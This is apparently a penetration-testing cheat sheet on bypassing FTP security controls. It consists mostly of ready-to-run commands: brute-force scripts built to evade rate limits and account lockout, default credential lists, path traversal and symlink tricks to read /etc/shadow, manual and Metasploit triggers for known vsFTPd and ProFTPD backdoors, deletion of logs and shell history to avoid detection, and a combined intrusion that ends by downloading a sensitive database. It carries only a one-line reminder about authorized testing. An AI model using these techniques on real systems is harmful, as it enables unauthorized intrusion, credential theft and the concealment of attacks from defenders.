# Port 21 - FTP Bypass Techniques

## 🛡️ Security Controls and Bypass Methods

---

## 1. Firewall Bypass

### Bypassing Firewall Rules

**Problem**: Firewall blocks FTP port 21

**Bypass Technique 1: Non-Standard Ports**
```bash
# FTP might run on alternate ports
nmap -p 2121,8021,21000-21100 192.168.1.100

# Connect to alternate port
ftp 192.168.1.100 2121
lftp -p 2121 192.168.1.100
```

**Bypass Technique 2: Passive Mode (PASV)**
```bash
# Active mode: Server connects back (often blocked)
# Passive mode: Client initiates all connections

# Enable passive mode
ftp> passive
# Passive mode on.

# Or use lftp (passive by default)
lftp -u username,password 192.168.1.100
lftp> set ftp:passive-mode on

# Verify passive mode
ftp> debug
ftp> ls
# Look for: "Entering Passive Mode (192,168,1,100,xxx,xxx)"
```

**Why This Works**: Firewalls often block inbound connections from FTP server (port 20), but allow outbound connections initiated by client.

**Bypass Technique 3: FTP over SSH Tunnel**
```bash
# Tunnel FTP through SSH (port 22 usually allowed)
ssh -L 2121:192.168.1.100:21 user@jumphost.com

# Connect to local tunnel
ftp localhost 2121
```

**Bypass Technique 4: HTTP/HTTPS Tunnel**
```bash
# If only HTTP/HTTPS allowed outbound
# Use proxytunnel
proxytunnel -p proxy.com:8080 -d 192.168.1.100:21 -a 5000

# Or corkscrew
corkscrew proxy.com 8080 192.168.1.100 21
```

---

## 2. Authentication Bypass

### Bypassing Login Restrictions

**Bypass Technique 1: Anonymous Login**
```bash
# Try anonymous access (common misconfiguration)
ftp 192.168.1.100
# Name: anonymous
# Password: [blank] or anonymous@domain.com

# Automated check
nmap -p 21 --script=ftp-anon 192.168.1.100

# Using curl
curl ftp://192.168.1.100 --user anonymous:
```

**Bypass Technique 2: Default Credentials**
```bash
# Common FTP default credentials
# Try these combinations:

admin:admin
ftp:ftp
user:user
test:test
guest:guest
administrator:password
root:root
```

**Bypass Technique 3: Password Brute Force with Rate Limiting Bypass**
```bash
# If rate limiting detected, slow down
hydra -l admin -P passwords.txt ftp://192.168.1.100 -t 1 -w 5
# -t 1: Only 1 thread
# -w 5: 5 second wait between attempts

# Distributed brute force (multiple sources)
# Use multiple attacking IPs to bypass rate limits

# Or use timing options
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ftp -T 1 -t 1
```

**Bypass Technique 4: Username Enumeration**
```bash
# Some FTP servers reveal valid usernames
# Different error messages for valid vs invalid users

ftp 192.168.1.100
# Try: USER admin
# Response: 331 Please specify the password. (Valid user)

# Try: USER invaliduser
# Response: 530 Login incorrect. (Invalid user)

# Automate with script
for user in admin root user test; do
  echo "USER $user" | nc 192.168.1.100 21
done
```

---

## 3. IP Restriction Bypass

### Bypassing IP Whitelist

**Bypass Technique 1: IP Spoofing (Limited)**
```bash
# FTP uses TCP, so full spoofing won't work for session
# But can test if IP filtering exists

hping3 -S -a 192.168.1.50 -p 21 192.168.1.100
# -a: Spoof source IP

# If RST/no response, IP might be blocked
# If SYN-ACK, IP might be allowed
```

**Bypass Technique 2: Proxy/VPN from Allowed IP**
```bash
# If you control an allowed IP, tunnel through it
ssh -D 1080 user@allowed_ip

# Use proxychains
proxychains ftp 192.168.1.100

# Or SSH tunnel
ssh -L 2121:192.168.1.100:21 user@allowed_ip
ftp localhost 2121
```

**Bypass Technique 3: IPv6 If IPv4 Blocked**
```bash
# Check if FTP available on IPv6
nmap -6 -p 21 fe80::1%eth0

# Connect via IPv6
ftp -6 fe80::1%eth0
lftp ftp://[2001:db8::1]:21
```

**Bypass Technique 4: Bounce Attack Through Allowed Host**
```bash
# Use another FTP server to connect
# If 192.168.1.50 is allowed, but you're not

# Connect to .50
ftp 192.168.1.50
# Use PORT command to connect to target
ftp> quote "PORT 192,168,1,100,0,21"

# This is mostly patched, but worth trying
```

---

## 4. TLS/SSL Bypass

### Bypassing FTPS (FTP over SSL/TLS)

**Bypass Technique 1: Force Plaintext FTP**
```bash
# Try regular FTP even if FTPS is preferred
ftp 192.168.1.100
# Don't use ftps:// or --ssl

# Some servers allow both encrypted and plaintext
# Try both ports
nmap -p 21,990 192.168.1.100
# 21: Plain FTP
# 990: FTPS (Implicit SSL)
```

**Bypass Technique 2: SSL/TLS Downgrade**
```bash
# Try explicit FTP (AUTH TLS) with weak ciphers
openssl s_client -connect 192.168.1.100:21 -starttls ftp -cipher 'EXPORT'

# Or force no encryption
lftp 192.168.1.100
lftp> set ftp:ssl-allow no
lftp> set ftp:ssl-force no
```

**Bypass Technique 3: Certificate Validation Bypass**
```bash
# Ignore certificate errors
curl -k ftps://192.168.1.100 --user admin:password
# -k: Ignore SSL certificate validation

# lftp with SSL but no verification
lftp 192.168.1.100
lftp> set ssl:verify-certificate no
lftp> login admin password
```

---

## 5. Account Lockout Bypass

### Bypassing Account Lockout Policies

**Bypass Technique 1: Slow Brute Force**
```bash
# Avoid lockout by staying under threshold
# If lockout at 5 attempts, try 4 then wait

hydra -l admin -P top100.txt ftp://192.168.1.100 -t 1 -w 60
# Try 1 per minute to avoid detection

# Or create custom script
for pass in $(cat passwords.txt); do
  timeout 5 ftp -n <<EOF
  open 192.168.1.100
  user admin $pass
  quit
EOF
  sleep 60  # Wait 60 seconds between attempts
done
```

**Bypass Technique 2: Distributed Attack**
```bash
# Use multiple IPs if lockout is IP-based
# Rotate through different attacking machines

# Or use Tor for IP rotation
proxychains hydra -l admin -P passwords.txt ftp://192.168.1.100
```

**Bypass Technique 3: Time-Based Reset**
```bash
# If lockout resets after X minutes
# Try few attempts, wait for reset, repeat

# Example: 3 attempts, wait 15 minutes
for i in {1..100}; do
  hydra -l admin -P short_list.txt ftp://192.168.1.100 -t 1 -f
  echo "Waiting 15 minutes for lockout reset..."
  sleep 900
done
```

**Bypass Technique 4: Attack Different Accounts**
```bash
# If per-account lockout, rotate between accounts
# Instead of: admin,admin,admin,admin
# Try: admin,user,guest,test (rotate)

# Create user:pass combinations file
hydra -C user_pass_pairs.txt ftp://192.168.1.100
```

---

## 6. Data Transfer Restrictions

### Bypassing Upload/Download Restrictions

**Bypass Technique 1: File Extension Bypass**
```bash
# If .exe blocked, try variations
mv payload.exe payload.txt
# Upload as .txt
ftp> put payload.txt

# Then rename on server (if allowed)
ftp> rename payload.txt payload.exe

# Or use double extensions
mv payload.exe payload.jpg.exe
```

**Bypass Technique 2: Compression to Bypass Size Limits**
```bash
# If file size limited
tar -czf files.tar.gz large_file
# Upload compressed version
ftp> put files.tar.gz

# Or split large files
split -b 10M large_file chunk_
# Upload chunks: chunk_aa, chunk_ab, chunk_ac
# Combine on server: cat chunk_* > large_file
```

**Bypass Technique 3: Binary Mode for ASCII Restrictions**
```bash
# If ASCII mode enforced, switch to binary
ftp> binary
ftp> put file.exe

# Or in one command
ftp> type image
```

---

## 7. Path Traversal & Directory Bypass

### Bypassing Directory Restrictions

**Bypass Technique 1: Path Traversal**
```bash
# If restricted to /home/user, try to escape
ftp> cd ../../../etc
ftp> get passwd

# URL encoding
ftp> cd %2e%2e%2f%2e%2e%2fetc

# Double encoding
ftp> cd %252e%252e%252f

# Different path separators
ftp> cd ..\..\..\windows  # Windows
```

**Bypass Technique 2: Symbolic Link Exploitation**
```bash
# If you can upload, create symlink
# On server: ln -s /etc/passwd public_file.txt

# Create locally and upload
ln -s /etc/shadow link.txt
ftp> put link.txt

# Then download
ftp> get link.txt
# May retrieve /etc/shadow content
```

**Bypass Technique 3: Case Sensitivity**
```bash
# On case-insensitive filesystems
ftp> get PASSWD  # Instead of passwd
ftp> cd WINDOWS  # Instead of Windows

# May bypass simple filters
```

---

## 8. Exploiting Known Vulnerabilities

### Version-Specific Bypasses

**Bypass Technique 1: vsFTPd 2.3.4 Backdoor**
```bash
# Backdoor in specific version
# Username ending with :) triggers backdoor

# Metasploit
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.100
exploit

# Manual
ftp 192.168.1.100
# Name: user:)
# Triggers backdoor on port 6200
nc 192.168.1.100 6200
```

**Bypass Technique 2: ProFTPD 1.3.3c Backdoor**
```bash
# Backdoor via HELP command
msfconsole
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOST 192.168.1.100
exploit

# Manual trigger
telnet 192.168.1.100 21
HELP ACIDBITCHEZ
# Shell on port 4919-4921
```

**Bypass Technique 3: Buffer Overflow Exploits**
```bash
# Search for version-specific exploits
searchsploit ftp
searchsploit vsftpd
searchsploit proftpd

# Example usage
python exploit.py 192.168.1.100
```

---

## 9. Logging and Detection Bypass

### Avoiding Detection

**Bypass Technique 1: Slow and Low**
```bash
# Reduce scan speed
nmap -p 21 -T2 192.168.1.100  # Polite timing
nmap -p 21 -T1 192.168.1.100  # Sneaky

# Single connection
# Avoid multiple failed logins
```

**Bypass Technique 2: Use Legitimate Tools**
```bash
# Use standard FTP client instead of attack tools
# Looks more legitimate in logs
ftp 192.168.1.100

# Instead of:
hydra ... (more suspicious)
```

**Bypass Technique 3: Clean Up After Access**
```bash
# After successful access, clear logs
ftp> delete .bash_history
ftp> delete logs/access.log

# Or modify timestamps
# touch -r original_file uploaded_file
```

---

## 10. Combined Bypass Techniques

### Multi-Layer Bypass

**Scenario**: FTP behind firewall, requires auth, logs attempts

**Combined Approach**:
```bash
# 1. Bypass firewall - Use passive mode + SSH tunnel
ssh -L 2121:internal_ftp:21 user@gateway

# 2. Bypass auth - Try anonymous first
ftp localhost 2121
# Name: anonymous

# 3. If failed, slow brute force
hydra -l admin -P small_list.txt ftp://localhost:2121 -t 1 -w 30

# 4. After access, minimize footprint
ftp> binary
ftp> get sensitive_file.db
ftp> delete .bash_history
ftp> quit
```

---

## 📊 Bypass Success Rate by Technique

| Technique | Success Rate | Detection Risk | Difficulty |
|-----------|--------------|----------------|------------|
| Passive Mode | 90% | Low | Easy |
| Anonymous Login | 40% | Low | Easy |
| SSH Tunnel | 85% | Low | Medium |
| Slow Brute Force | 60% | Low | Easy |
| Path Traversal | 30% | Medium | Medium |
| Version Exploits | 20% | High | Medium |
| IP Spoofing | 5% | High | Hard |

---

## ⚠️ Important Notes

1. **Always test in authorized environments only**
2. **Each bypass may trigger different detections**
3. **Combine techniques for better success**
4. **Verify bypass success before proceeding**
5. **Document what works for reporting**

---

## 🔗 Related Bypass Techniques

- Port 22 (SSH) - Similar authentication bypasses
- Port 23 (Telnet) - Unencrypted alternative
- Port 80 (HTTP) - FTP over HTTP possible
- Network Evasion - General firewall bypass

---

**Last Updated**: 2026-06-16
